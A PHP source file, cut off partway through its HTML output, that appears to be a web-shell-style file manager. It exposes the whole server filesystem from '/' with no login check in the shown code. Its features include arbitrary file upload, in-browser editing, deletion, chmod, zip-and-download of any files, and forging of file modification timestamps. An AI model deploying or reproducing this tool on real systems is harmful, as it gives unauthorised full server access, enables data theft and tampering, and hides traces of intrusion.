<?php
// Clean any existing output buffers
while (ob_get_level()) ob_end_clean();
ob_start();

// Session code
session_name('filemanager');
session_start();

// Error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('log_errors', 1);

// Your existing session initialization...
if (!isset($_SESSION['selected_files'])) {
    $_SESSION['selected_files'] = [];
}

$ROOT = realpath('/');
$reqPath = trim((string)($_GET['path'] ?? ''), "/");
$CURRENT = $reqPath === '' ? $ROOT : realpath($ROOT . '/' . $reqPath);
if ($CURRENT === false || strpos($CURRENT, $ROOT) !== 0) {
    $CURRENT = $ROOT;
    $reqPath = '';
}

/* ==========================
   POST HANDLING (MOVED HERE!)
   ========================== */
   
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = (string)$_POST['action'];
    $targetRel = (string)($_POST['path'] ?? '');
    $targetAbs = fm_safe_target($targetRel);

    switch ($action) {
        case 'delete':
            if ($targetAbs && $targetAbs !== $ROOT && file_exists($targetAbs)) {
                if (is_dir($targetAbs)) {
                    fm_delete_dir($targetAbs);
                } else {
                    @unlink($targetAbs);
                }
            }
            $parentRel = trim(dirname($targetRel), '/');
            header("Location: ?path=" . urlencode($parentRel));
            exit;

        case 'create_file':
            $name = trim((string)($_POST['name'] ?? ''));
            if ($name !== '' && !str_contains($name, '/')) {
                $newAbs = fm_safe_target(($reqPath ? $reqPath.'/' : '').$name, true);
                if ($newAbs && !file_exists($newAbs)) {
                    @file_put_contents($newAbs, "");
                }
            }
            fm_redirect("?path=" . urlencode($reqPath));
            exit;

        case 'create_folder':
            $name = trim((string)($_POST['name'] ?? ''));
            if ($name !== '' && !str_contains($name, '/')) {
                $newAbs = fm_safe_target(($reqPath ? $reqPath.'/' : '').$name, true);
                if ($newAbs && !file_exists($newAbs)) {
                    @mkdir($newAbs, 0755);
                }
            }
            fm_redirect("?path=" . urlencode($reqPath));
            exit;

        case 'rename':
            $new = trim((string)($_POST['new_name'] ?? ''));
            if ($targetAbs && $new !== '' && !str_contains($new, '/')) {
                $destAbs = dirname($targetAbs) . '/' . $new;
                if (strpos(realpath(dirname($destAbs)), $ROOT) === 0) {
                    @rename($targetAbs, $destAbs);
                }
            }
            $parentRel = trim(dirname($targetRel), '/');
            header("Location: ?path=" . urlencode($parentRel));
            exit;

        case 'upload':
    error_log("UPLOAD STARTED");
    
    // Check if file was uploaded successfully
    if (empty($_FILES['upload']['name']) || $_FILES['upload']['error'] !== UPLOAD_ERR_OK) {
        error_log("UPLOAD ERROR: " . ($_FILES['upload']['error'] ?? 'No file'));
        fm_redirect("?path=" . urlencode($reqPath));
        exit;
    }

    $filename = basename($_FILES['upload']['name']);
    $destRel = ($reqPath ? $reqPath.'/' : '') . $filename;
    $destAbs = fm_safe_target($destRel, true);
    
    error_log("Uploading: $filename to $destAbs");
    
    if (!$destAbs) {
        error_log("UPLOAD BLOCKED: Safe target returned null");
        fm_redirect("?path=" . urlencode($reqPath));
        exit;
    }

    $tempFile = $_FILES['upload']['tmp_name'];
    
    // Verify temp file
    if (!file_exists($tempFile)) {
        error_log("UPLOAD ERROR: Temp file missing");
        fm_redirect("?path=" . urlencode($reqPath));
        exit;
    }

    // Ensure directory exists
    $destDir = dirname($destAbs);
    if (!is_dir($destDir)) {
        mkdir($destDir, 0755, true);
    }

    // Copy with error handling
    if (copy($tempFile, $destAbs)) {
        error_log("UPLOAD SUCCESS: $destAbs");
        // Verify the copy worked
        if (file_exists($destAbs) && filesize($destAbs) > 0) {
            error_log("UPLOAD VERIFIED: File exists with size " . filesize($destAbs));
        } else {
            error_log("UPLOAD WARNING: Copy succeeded but file missing or empty");
        }
        unlink($tempFile);
    } else {
        error_log("UPLOAD FAILED: Copy operation failed");
        error_log("Source readable: " . (is_readable($tempFile) ? 'YES' : 'NO'));
        error_log("Dest writable: " . (is_writable($destDir) ? 'YES' : 'NO'));
        error_log("Last error: " . (error_get_last()['message'] ?? 'Unknown'));
    }

    fm_redirect("?path=" . urlencode($reqPath));
    exit;
        case 'download':
            if ($targetAbs && is_file($targetAbs)) {
                // Clear any output buffers
                while (ob_get_level()) ob_end_clean();
                
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.basename($targetAbs).'"');
                header('Content-Length: ' . filesize($targetAbs));
                header('Cache-Control: no-cache, must-revalidate');
                header('Expires: 0');
                readfile($targetAbs);
                exit;
            }
            fm_redirect("?path=" . urlencode($reqPath));
            exit;

        case 'save':
    $fileRel = (string)($_POST['file_path'] ?? '');
    $targetAbs = fm_safe_target($fileRel);
    
    if (!$targetAbs) {
        error_log("SAVE FAILED: Safe target blocked - $fileRel");
        $saveError = "Security validation failed for path: " . htmlspecialchars($fileRel);
    } elseif (!is_file($targetAbs)) {
        error_log("SAVE FAILED: Not a file - $targetAbs");
        $saveError = "File does not exist: " . htmlspecialchars($fileRel);
    } elseif (!is_writable($targetAbs)) {
        error_log("SAVE FAILED: Not writable - $targetAbs");
        $saveError = "File is not writable. Check permissions: " . htmlspecialchars($fileRel);
    } else {
        $content = (string)($_POST['content'] ?? '');
        
        // Use file locking to prevent race conditions
        if ($handle = @fopen($targetAbs, 'wb')) {
            if (flock($handle, LOCK_EX)) {
                $bytes = fwrite($handle, $content);
                fflush($handle);
                flock($handle, LOCK_UN);
                if ($bytes !== false) {
                    $saveSuccess = "File saved successfully! (" . $bytes . " bytes written)";
                    // Update modification time
                    @touch($targetAbs);
                } else {
                    $saveError = "Failed to write content to file.";
                }
            } else {
                $saveError = "Could not lock file for writing (another process may be using it).";
            }
            fclose($handle);
        } else {
            $saveError = "Failed to open file for writing. Check file permissions.";
        }
    }
    break;

        case 'change_date':
            $newM = (string)($_POST['new_mtime'] ?? '');
            $ts = strtotime($newM);
            if ($targetAbs && $ts !== false) {
                @touch($targetAbs, $ts, $ts);
            }
            $parentRel = trim(dirname($targetRel), '/');
            header("Location: ?path=" . urlencode($parentRel));
            exit;

        // NEW: chmod feature
        case 'chmod':
            $newPerms = (string)($_POST['new_perms'] ?? '');
            if ($targetAbs && preg_match('/^[0-7]{3,4}$/', $newPerms)) {
                @chmod($targetAbs, octdec($newPerms));
            }
            $parentRel = trim(dirname($targetRel), '/');
            header("Location: ?path=" . urlencode($parentRel));
            exit;

        // NEW: Selection actions
        case 'select_item':
            $itemRel = (string)($_POST['item_path'] ?? '');
            if ($itemRel && !in_array($itemRel, $_SESSION['selected_files'])) {
                $_SESSION['selected_files'][] = $itemRel;
            }
            fm_redirect("?path=" . urlencode($reqPath));
            exit;

        case 'deselect_item':
            $itemRel = (string)($_POST['item_path'] ?? '');
            if ($itemRel && ($key = array_search($itemRel, $_SESSION['selected_files'])) !== false) {
                unset($_SESSION['selected_files'][$key]);
                $_SESSION['selected_files'] = array_values($_SESSION['selected_files']);
            }
            fm_redirect("?path=" . urlencode($reqPath));
            exit;

        case 'clear_selection':
            $_SESSION['selected_files'] = [];
            fm_redirect("?path=" . urlencode($reqPath));
            exit;

        case 'select_all':
            // Select all items in current directory
            $items = @scandir($CURRENT) ?: [];
            foreach ($items as $it) {
                if ($it === '.' || $it === '..') continue;
                $rel = ($reqPath === '' ? $it : $reqPath . '/' . $it);
                if (!in_array($rel, $_SESSION['selected_files'])) {
                    $_SESSION['selected_files'][] = $rel;
                }
            }
            fm_redirect("?path=" . urlencode($reqPath));
            exit;

        case 'create_zip':
            // Create zip from selected items
            if (!empty($_SESSION['selected_files'])) {
                // Check if ZipArchive is available
                if (!class_exists('ZipArchive')) {
                    error_log("ZIP ERROR: ZipArchive class not available");
                    $_SESSION['zip_error'] = "ZipArchive PHP extension is not available on this server.";
                    fm_redirect("?path=" . urlencode($reqPath));
                    exit;
                }
                
                $zip = new ZipArchive();
                $zipName = 'archive_' . date('Y-m-d_H-i-s') . '.zip';
                $zipPath = $CURRENT . '/' . $zipName;
                
                // Try to create the zip file
                if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                    $successCount = 0;
                    $errorCount = 0;
                    
                    foreach ($_SESSION['selected_files'] as $itemRel) {
                        $itemAbs = fm_safe_target($itemRel);
                        if ($itemAbs && file_exists($itemAbs)) {
                            $itemName = basename($itemAbs);
                            
                            if (is_dir($itemAbs)) {
                                // Add directory recursively with proper path handling
                                $addResult = fm_add_dir_to_zip($zip, $itemAbs, $itemName);
                                if ($addResult) {
                                    $successCount++;
                                } else {
                                    $errorCount++;
                                    error_log("ZIP ERROR: Failed to add directory: $itemAbs");
                                }
                            } else {
                                // Add file with proper path
                                if ($zip->addFile($itemAbs, $itemName)) {
                                    $successCount++;
                                } else {
                                    $errorCount++;
                                    error_log("ZIP ERROR: Failed to add file: $itemAbs");
                                }
                            }
                        } else {
                            $errorCount++;
                            error_log("ZIP ERROR: Item not found or inaccessible: $itemRel");
                        }
                    }
                    
                    // Close the zip file
                    if ($zip->close()) {
                        if ($successCount > 0) {
                            $_SESSION['zip_success'] = "Zip archive created successfully! ($successCount items added)";
                            if ($errorCount > 0) {
                                $_SESSION['zip_warning'] = "$errorCount items could not be added to the archive.";
                            }
                        } else {
                            $_SESSION['zip_error'] = "Failed to add any items to the zip archive.";
                            // Remove empty zip file
                            if (file_exists($zipPath)) {
                                unlink($zipPath);
                            }
                        }
                    } else {
                        $_SESSION['zip_error'] = "Failed to create zip file. Check server permissions.";
                        error_log("ZIP ERROR: Failed to close zip file: $zipPath");
                    }
                    
                    // Clear selection after creating zip
                    $_SESSION['selected_files'] = [];
                } else {
                    $_SESSION['zip_error'] = "Could not create zip file. Check directory permissions.";
                    error_log("ZIP ERROR: Could not open zip file for writing: $zipPath");
                }
            } else {
                $_SESSION['zip_error'] = "No items selected for zipping.";
            }
            fm_redirect("?path=" . urlencode($reqPath));
            exit;

        case 'download_zip':
            $zipRel = (string)($_POST['zip_path'] ?? '');
            $zipAbs = fm_safe_target($zipRel);
            
            if ($zipAbs && is_file($zipAbs) && pathinfo($zipAbs, PATHINFO_EXTENSION) === 'zip') {
                // Clear any output buffers
                while (ob_get_level()) ob_end_clean();
                
                header('Content-Description: File Transfer');
                header('Content-Type: application/zip');
                header('Content-Disposition: attachment; filename="'.basename($zipAbs).'"');
                header('Content-Length: ' . filesize($zipAbs));
                header('Cache-Control: no-cache, must-revalidate');
                header('Expires: 0');
                readfile($zipAbs);
                exit;
            }
            fm_redirect("?path=" . urlencode($reqPath));
            exit;
    }
}

/* ==========================
   FILE EDIT VIEW
   ========================== */
if (is_file($CURRENT)) {
    // Double-check file accessibility
    if (!is_readable($CURRENT) || !is_writable($CURRENT)) {
        header("HTTP/1.0 403 Forbidden");
        die("File access denied: Check file permissions for " . htmlspecialchars($CURRENT));
    }
    
    $content = @file_get_contents($CURRENT);
    if ($content === false) {
        header("HTTP/1.0 500 Internal Server Error");
        die("Unable to read file: " . htmlspecialchars($CURRENT));
    }
    
    $fileRel = $reqPath;
    $parentRel = trim(dirname($fileRel), '/');
    $mtime = @filemtime($CURRENT);
    
    // Enhanced save handling
    $saveMessage = '';
    if (!empty($saveSuccess)) {
        $saveMessage = '<div style="background:var(--ok);color:white;padding:10px;border-radius:8px;margin-bottom:16px;">'.$saveSuccess.'</div>';
    } elseif (!empty($saveError)) {
        $saveMessage = '<div style="background:var(--danger);color:white;padding:10px;border-radius:8px;margin-bottom:16px;">'.$saveError.'</div>';
    }
    
    echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Edit '.htmlspecialchars(basename($CURRENT)).'</title>
    <style>
    :root{
    --bg: #0f172a; /* Dark blue background */
    --card: #1e293b; /* Darker cards/containers */
    --text: #e2e8f0; /* Light gray text */
    --muted: #94a3b8; /* Muted text */
    --pri: #3b82f6; /* Blue primary */
    --danger: #ef4444; /* Red danger */
    --warn: #f59e0b; /* Amber warning */
    --ok: #10b981; /* Green success */
}
body{
    margin:0;
    background:var(--bg);
    color: var(--text); /* Add text color */
    font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Helvetica Neue",Arial;
    padding:24px
}
.wrap{max-width:1100px;margin:0 auto}
    .bar{display:flex;gap:8px;align-items:center;margin-bottom:16px}
    .btn{padding:8px 12px;border:none;border-radius:10px;background:var(--pri);color:#fff;font-weight:600;cursor:pointer}
    .btn.outline{background:transparent;color:var(--pri);border:1px solid #dbe2ea}
    .btn.danger{background:var(--danger)}
    .btn.gray{background:#6b6b6b;color:#111}
    .btn.success{background:var(--ok)}
textarea{
    width:100%;
    height:60vh;
    border:1px solid #475569;
    border-radius:12px;
    padding:12px;
    font-family:ui-monospace,SFMono-Regular,Consolas,Monaco,monospace;
    background: #1a2332; /* Slightly darker than the card background */
    color: #e2e8f0; /* Light text color */
    resize: vertical; /* Optional: only allow vertical resizing */
}    .row{display:flex;gap:12px;flex-wrap:wrap;margin-top:12px}
    .card{background:#1a2332;border-radius:14px;padding:14px;border:1px solid #475569}
    label{font-size:12px;color:var(--muted);display:block;margin-bottom:6px}
    input[type="datetime-local"]{padding:8px 10px;border:1px solid #e1e6ee;border-radius:10px}
    .breadcrumb a:link {
  color: #829bb0;
}
input[type="text"],
input[type="datetime-local"],
input[type="file"]{
    padding:6px 8px;
    border:1px solid #475569; /* Darker border */
    border-radius:10px;
    background: var(--card); /* Dark background */
    color: var(--text); /* Light text */
}

.breadcrumb a:visited {
  color: #829bb0;
}

.breadcrumb a:hover {
  color: #9bc0e1;
}

.breadcrumb a:active {
  color: #9bc0e1;
}
/* Unvisited link */
a:link {
  color: #829bb0;
}

/* Visited link */
a:visited {
  color: #829bb0;
}

/* Mouse over link */
a:hover {
  color: #9bc0e1;
}

/* Selected link */
a:active {
  color: #9bc0e1;
}

/* Selection styles */
.selected-item {
    background-color: rgba(59, 130, 246, 0.2) !important;
    border: 2px solid var(--pri) !important;
}
.selection-info {
    background: var(--card);
    border: 1px solid var(--pri);
    border-radius: 10px;
    padding: 12px;
    margin: 12px 0;
    display: flex;
    justify-content: space-between;
    align-items: center;
}
.selection-count {
    font-weight: bold;
    color: var(--pri);
}
.alert-success {
    background: var(--ok);
    color: white;
    padding: 10px;
    border-radius: 8px;
    margin-bottom: 16px;
}
.alert-error {
    background: var(--danger);
    color: white;
    padding: 10px;
    border-radius: 8px;
    margin-bottom: 16px;
}
.alert-warning {
    background: var(--warn);
    color: white;
    padding: 10px;
    border-radius: 8px;
    margin-bottom: 16px;
}
.file-size {
    font-size: 11px;
    color: var(--muted);
    margin-top: 2px;
}
.folder-items {
    font-size: 11px;
    color: var(--muted);
    margin-top: 2px;
}
</style></head><body><div class="wrap">';

    echo fm_breadcrumb($reqPath);
    
    // Display save message here
    echo $saveMessage;

    echo '<br>';

    echo '<div class="bar">
    
            <a class="btn gray" href="?path='.urlencode($parentRel).'" style="display:inline; text-decoration:none;">← Back</a>
           

            <form method="post" onsubmit="return confirm(\'Delete this file?\');" style="display:inline;">
                <input type="hidden" name="action" value="delete">
                <input type="hidden" name="path" value="'.htmlspecialchars($fileRel).'">
                <button class="btn danger" type="submit">Delete</button>
            </form>
            <form method="post" action="" style="display:inline;">
                <input type="hidden" name="action" value="download">
                <input type="hidden" name="path" value="'.htmlspecialchars($fileRel).'">
                <button class="btn gray" type="submit">Download</button>
            </form>
          </div>';

    echo '<form method="post">
        <input type="hidden" name="action" value="save">
        <input type="hidden" name="file_path" value="'.htmlspecialchars($fileRel).'">
        <textarea name="content" id="fileContent">'.htmlspecialchars((string)$content).'</textarea>
        <div class="bar" style="margin-top:12px;">
            <button class="btn gray" type="submit" id="saveBtn">Save Changes</button>
            <span style="color:var(--muted);font-size:14px;margin-left:12px;">File: '.htmlspecialchars($fileRel).'</span>
        </div>
      </form>';

    echo '<div class="row">
            <div class="card">
                <form method="post">
                    <input type="hidden" name="action" value="change_date">
                    <input type="hidden" name="path" value="'.htmlspecialchars($fileRel).'">
                    <label>Set Modified Date/Time</label>
                    <input type="datetime-local" name="new_mtime" value="'.htmlspecialchars($mtime? date('Y-m-d\TH:i:s', $mtime) : '').'" step="1">
                    <button class="btn gray" type="submit" style="margin-left:8px">Update</button>
                </form>
            </div>
          </div>';

    // Add some JavaScript to prevent accidental navigation
    echo '<script>
        let isDirty = false;
        const textarea = document.getElementById("fileContent");
        const saveBtn = document.getElementById("saveBtn");
        
        textarea.addEventListener("input", () => {
            isDirty = true;
            saveBtn.textContent = "Save Changes *";
            saveBtn.style.background = "var(--warn)";
        });
        
        window.addEventListener("beforeunload", (e) => {
            if (isDirty) {
                e.preventDefault();
                e.returnValue = "You have unsaved changes. Are you sure you want to leave?";
            }
        });
        
        document.querySelector("form").addEventListener("submit", () => {
            isDirty = false;
        });
    </script>';

    echo '</div></body></html>';
    exit;
}

function fm_redirect($url) {
    if (ob_get_level()) ob_clean();
    header("Location: " . $url);
    exit;
}

function fm_safe_target(string $rel, bool $forCreate = false): ?string {
    global $ROOT;
    
    $rel = ltrim($rel, "/");
    
    // Basic security checks
    if (strpos($rel, '..') !== false || strpos($rel, "\0") !== false) {
        error_log("SAFE_TARGET BLOCKED: Path traversal detected - $rel");
        return null;
    }
    
    $target = $ROOT . '/' . $rel;
    
    if ($forCreate) {
        // For create operations, check if parent directory exists and is within ROOT
        $parent = dirname($target);
        
        // Use realpath on parent only, not on target (which may not exist yet)
        $parentReal = realpath($parent);
        if ($parentReal === false) {
            // Parent doesn't exist, but we might create it
            // Check if the theoretical parent path is within ROOT
            if (strpos($parent, $ROOT) === 0) {
                return $target;
            }
            error_log("SAFE_TARGET BLOCKED: Parent outside ROOT - $parent");
            return null;
        }
        
        if (strpos($parentReal, $ROOT) === 0) {
            return $target;
        }
        error_log("SAFE_TARGET BLOCKED: Parent realpath outside ROOT - $parentReal");
        return null;
    }
    
    // For existing files, use a more tolerant approach
    if (file_exists($target)) {
        $real = realpath($target);
        if ($real !== false && strpos($real, $ROOT) === 0) {
            return $real;
        }
        error_log("SAFE_TARGET BLOCKED: File exists but realpath failed - $target");
    } else {
        error_log("SAFE_TARGET BLOCKED: File doesn't exist - $target");
    }
    
    return null;
}


function fm_perms(string $path): string {
    return substr(sprintf('%o', fileperms($path)), -4);
}

// Function to format file sizes
function fm_format_size(int $bytes): string {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } else {
        return $bytes . ' bytes';
    }
}

// Function to count items in a directory
function fm_count_items(string $path): int {
    if (!is_dir($path) || !is_readable($path)) {
        return 0;
    }
    $items = @scandir($path);
    if ($items === false) {
        return 0;
    }
    return count(array_diff($items, ['.', '..']));
}

// IMPROVED: Function to add directory recursively to zip with better error handling
function fm_add_dir_to_zip(ZipArchive $zip, string $directory, string $zipPath): bool {
    if (!is_dir($directory) || !is_readable($directory)) {
        error_log("ZIP ERROR: Cannot read directory: $directory");
        return false;
    }
    
    $success = true;
    $nodes = glob($directory . '/*');
    
    foreach ($nodes as $node) {
        $localPath = $zipPath . '/' . basename($node);
        
        if (is_dir($node)) {
            // Create directory entry in zip
            if (!$zip->addEmptyDir($localPath)) {
                error_log("ZIP WARNING: Failed to create directory in zip: $localPath");
                $success = false;
            }
            // Recursively add directory contents
            if (!fm_add_dir_to_zip($zip, $node, $localPath)) {
                $success = false;
            }
        } else if (is_file($node) && is_readable($node)) {
            // Add file to zip
            if (!$zip->addFile($node, $localPath)) {
                error_log("ZIP ERROR: Failed to add file to zip: $node");
                $success = false;
            }
        } else {
            error_log("ZIP WARNING: Skipping inaccessible file: $node");
            $success = false;
        }
    }
    
    return $success;
}


$items = @scandir($CURRENT) ?: [];
$dirs = $files = [];
foreach ($items as $it) {
    if ($it === '.' || $it === '..') continue;
    $abs = $CURRENT . '/' . $it;
    if (is_dir($abs)) $dirs[] = $it; else $files[] = $it;
}
natcasesort($dirs);
natcasesort($files);
$listed = array_merge($dirs, $files);

echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>File Manager</title>
<style>
:root{
    --bg: #0f172a; /* Dark blue background */
    --card: #1e293b; /* Darker cards/containers */
    --text: #e2e8f0; /* Light gray text */
    --muted: #94a3b8; /* Muted text */
    --pri: #3b82f6; /* Blue primary */
    --danger: #ef4444; /* Red danger */
    --warn: #f59e0b; /* Amber warning */
    --ok: #10b981; /* Green success */
}
*{box-sizing:border-box}
body{
    margin:0;
    background:var(--bg);
    color: var(--text); /* Add text color */
    font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Helvetica Neue",Arial;
    padding:24px
}
.wrap{max-width:1200px;margin:0 auto}
h1{margin:0 0 16px;font-size:22px}
table{width:100%;border-collapse:separate;border-spacing:0 8px}
th,td{padding:10px 12px}
tr{
    background: var(--card); /* Changed from #fff */
    border:1px solid #334155; /* Darker border */
    border-radius:12px
}
tr td:first-child{border-top-left-radius:12px;border-bottom-left-radius:12px}
tr td:last-child{border-top-right-radius:12px;border-bottom-right-radius:12px}
th{font-size:12px;color:var(--muted);text-align:left}
.name a{color:#0a58ca;text-decoration:none}
.badge{
    font-size:12px;
    color:var(--text); /* Changed from #555 */
    background:#475569; /* Darker background */
    padding:4px 8px;
    border-radius:20px
}
.actions form{display:inline;margin:0 4px}
.btn{padding:6px 10px;border:none;border-radius:10px;background:var(--pri);color:#fff;font-weight:600;cursor:pointer}
.btn.small{padding:5px 8px;font-size:12px}
.btn.danger{background:var(--danger)}
.btn.warn{background:var(--warn)}
.btn.gray{
    background:#475569; /* Darker gray */
    color:var(--text) /* Changed from #111 */
}
.btn.success{background:var(--ok)}
input[type="text"],
input[type="datetime-local"],
input[type="file"]{
    padding:6px 8px;
    border:1px solid #475569; /* Darker border */
    border-radius:10px;
    background: var(--card); /* Dark background */
    color: var(--text); /* Light text */
}
.toolbar{display:flex;gap:8px;flex-wrap:wrap;margin:12px 0}
.icon{margin-right:6px}
.meta{font-size:12px;color:var(--muted)}
.breadcrumb a:link {
  color: #829bb0;
}

.breadcrumb a:visited {
  color: #829bb0;
}

.breadcrumb a:hover {
  color: #9bc0e1;
}

.breadcrumb a:active {
  color: #9bc0e1;
}
/* Unvisited link */
a:link {
  color: #829bb0;
}

/* Visited link */
a:visited {
  color: #829bb0;
}

/* Mouse over link */
a:hover {
  color: #9bc0e1;
}

/* Selected link */
a:active {
  color: #9bc0e1;
}

/* Selection styles */
.selected-item {
    background-color: rgba(59, 130, 246, 0.2) !important;
    border: 2px solid var(--pri) !important;
}
.selection-info {
    background: var(--card);
    border: 1px solid var(--pri);
    border-radius: 10px;
    padding: 12px;
    margin: 12px 0;
    display: flex;
    justify-content: space-between;
    align-items: center;
}
.selection-count {
    font-weight: bold;
    color: var(--pri);
}
.checkbox-col {
    width: 30px;
    text-align: center;
}
.alert-success {
    background: var(--ok);
    color: white;
    padding: 10px;
    border-radius: 8px;
    margin-bottom: 16px;
}
.alert-error {
    background: var(--danger);
    color: white;
    padding: 10px;
    border-radius: 8px;
    margin-bottom: 16px;
}
.alert-warning {
    background: var(--warn);
    color: white;
    padding: 10px;
    border-radius: 8px;
    margin-bottom: 16px;
}
.zip-file {
    background: rgba(16, 185, 129, 0.1);
    border: 1px solid var(--ok);
    border-radius: 8px;
    padding: 8px 12px;
    margin: 4px 0;
    display: flex;
    justify-content: space-between;
    align-items: center;
}
.file-size {
    font-size: 11px;
    color: var(--muted);
    margin-top: 2px;
}
.folder-items {
    font-size: 11px;
    color: var(--muted);
    margin-top: 2px;
}
.name-cell {
    max-width: 300px;
}
.select-all-header {
    text-align: center;
}
</style></head><body><div class="wrap">';

echo fm_breadcrumb($reqPath);
echo '<hr>';
echo '<h1>Browsing: '.htmlspecialchars($reqPath === '' ? '/' : $reqPath).'</h1>';

// Display zip creation messages
if (isset($_SESSION['zip_success'])) {
    echo '<div class="alert-success">' . htmlspecialchars($_SESSION['zip_success']) . '</div>';
    unset($_SESSION['zip_success']);
}
if (isset($_SESSION['zip_error'])) {
    echo '<div class="alert-error">' . htmlspecialchars($_SESSION['zip_error']) . '</div>';
    unset($_SESSION['zip_error']);
}
if (isset($_SESSION['zip_warning'])) {
    echo '<div class="alert-warning">' . htmlspecialchars($_SESSION['zip_warning']) . '</div>';
    unset($_SESSION['zip_warning']);
}

// Show recently created zip files for download
$zipFiles = array_filter($listed, function($file) {
    return pathinfo($file, PATHINFO_EXTENSION) === 'zip';
});

if (!empty($zipFiles)) {
    echo '<div style="margin: 16px 0;">';
    echo '<h3>Available Zip Files:</h3>';
    foreach ($zipFiles as $zipFile) {
        $zipRel = ($reqPath === '' ? $zipFile : $reqPath . '/' . $zipFile);
        $zipAbs = $CURRENT . '/' . $zipFile;
        $zipSize = is_file($zipAbs) ? fm_format_size(filesize($zipAbs)) : 'Unknown';
        
        echo '<div class="zip-file">';
        echo '<div>';
        echo '<span>📦 ' . htmlspecialchars($zipFile) . '</span>';
        echo '<div class="file-size">Size: ' . $zipSize . '</div>';
        echo '</div>';
        echo '<form method="post" style="display:inline;">
                <input type="hidden" name="action" value="download_zip">
                <input type="hidden" name="zip_path" value="' . htmlspecialchars($zipRel) . '">
                <button class="btn success small" type="submit">Download Zip</button>
              </form>';
        echo '</div>';
    }
    echo '</div>';
}

// Selection info and actions
$selectedCount = count($_SESSION['selected_files']);
$totalItems = count($listed);

if ($totalItems > 0) {
    echo '<div class="selection-info">
            <div>
                <span class="selection-count">' . $selectedCount . ' of ' . $totalItems . ' items selected</span>
            </div>
            <div>
                <form method="post" style="display:inline;">
                    <input type="hidden" name="action" value="select_all">
                    <button class="btn gray small" type="submit">Select All</button>
                </form>';
    
    if ($selectedCount > 0) {
        echo '<form method="post" style="display:inline;">
                <input type="hidden" name="action" value="create_zip">
                <button class="btn success small" type="submit" onclick="return confirm(\'Create zip archive from selected items?\')">Create Zip Archive</button>
              </form>
              <form method="post" style="display:inline;">
                <input type="hidden" name="action" value="clear_selection">
                <button class="btn gray small" type="submit">Clear Selection</button>
              </form>';
    }
    
    echo '</div>
          </div>';
}

echo '<div class="toolbar">
        <form method="post" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload">
            <input type="file" name="upload" required>
            <button class="btn gray small" type="submit">Upload</button>
        </form>
        <form method="post">
            <input type="hidden" name="action" value="create_file">
            <input type="text" name="name" placeholder="newfile.txt" required>
            <button class="btn gray small" type="submit">Create File</button>
        </form>
        <form method="post">
            <input type="hidden" name="action" value="create_folder">
            <input type="text" name="name" placeholder="New Folder" required>
            <button class="btn gray small" type="submit">Create Folder</button>
        </form>
        <form method="post" action="?logout=1" onsubmit="return confirm(\'Logout?\');">
            <button class="btn gray small" type="submit">Logout</button>
        </form>
      </div>';

echo '<table><thead><tr>
        <th class="checkbox-col select-all-header">
            <form method="post">
                <input type="hidden" name="action" value="select_all">
                <button type="submit" style="background:none;border:none;cursor:pointer;color:var(--muted)" title="Select All">✓</button>
            </form>
        </th>
        <th>Name</th><th>Size</th><th>Modified</th><th>Permissions</th><th>Actions</th>
      </tr></thead><tbody>';

foreach ($listed as $name) {
    $abs = $CURRENT . '/' . $name;
    $rel = ($reqPath === '' ? $name : $reqPath . '/' . $name);
    $isDir = is_dir($abs);
    $icon = $isDir ? '&#128193;' : '&#128196;';
    $mtime = @filemtime($abs);
    $mtimeStr = $mtime ? date('Y-m-d H:i:s', $mtime) : '-';
    $perms = fm_perms($abs);
    
    // Get size information
    if ($isDir) {
        $itemCount = fm_count_items($abs);
        $sizeInfo = '<div class="folder-items">' . $itemCount . ' item' . ($itemCount != 1 ? 's' : '') . '</div>';
    } else {
        $fileSize = filesize($abs);
        $sizeInfo = '<div class="file-size">' . fm_format_size($fileSize) . '</div>';
    }
    
    $isSelected = in_array($rel, $_SESSION['selected_files']);
    $rowClass = $isSelected ? 'selected-item' : '';

    echo '<tr class="' . $rowClass . '"><td class="checkbox-col">';
    
    if ($isSelected) {
        echo '<form method="post">
                <input type="hidden" name="action" value="deselect_item">
                <input type="hidden" name="item_path" value="'.htmlspecialchars($rel).'">
                <button type="submit" style="background:none;border:none;cursor:pointer;color:var(--danger)" title="Deselect">✕</button>
              </form>';
    } else {
        echo '<form method="post">
                <input type="hidden" name="action" value="select_item">
                <input type="hidden" name="item_path" value="'.htmlspecialchars($rel).'">
                <button type="submit" style="background:none;border:none;cursor:pointer;color:var(--muted)" title="Select">◯</button>
              </form>';
    }
    
    echo '</td><td class="name-cell"><span class="icon">'.$icon.'</span>'.
         '<a href="?path='.urlencode($rel).'"><b>'.htmlspecialchars($name).'</b></a>'.
         '</td><td class="meta">'.$sizeInfo.'</td><td class="meta">'.$mtimeStr.'</td><td class="meta">'.$perms.'</td><td>';

    echo '<form method="post" onsubmit="return confirm(\'Delete '.htmlspecialchars($name).'?\');">
            <input type="hidden" name="action" value="delete">
            <input type="hidden" name="path" value="'.htmlspecialchars($rel).'">
            <button class="btn grey small danger" type="submit">Delete</button>
          </form>';

    echo '<form method="post">
            <input type="hidden" name="action" value="rename">
            <input type="hidden" name="path" value="'.htmlspecialchars($rel).'">
            <input type="text" name="new_name" placeholder="Rename to" required>
            <button class="btn gray small" type="submit">Rename</button>
          </form>';

    // NEW: chmod form
    echo '<form method="post">
            <input type="hidden" name="action" value="chmod">
            <input type="hidden" name="path" value="'.htmlspecialchars($rel).'">
            <input type="text" name="new_perms" placeholder="'.$perms.'" pattern="[0-7]{3,4}" required>
            <button class="btn gray small" type="submit">Chmod</button>
          </form>';

   if (!$isDir) {
    echo '<form method="post">
            <input type="hidden" name="action" value="download">
            <input type="hidden" name="path" value="'.htmlspecialchars($rel).'">
            <button class="btn small gray" type="submit">Download</button>
          </form>';
}


echo '<form method="post" style="margin-top:6px">
        <input type="hidden" name="action" value="change_date">
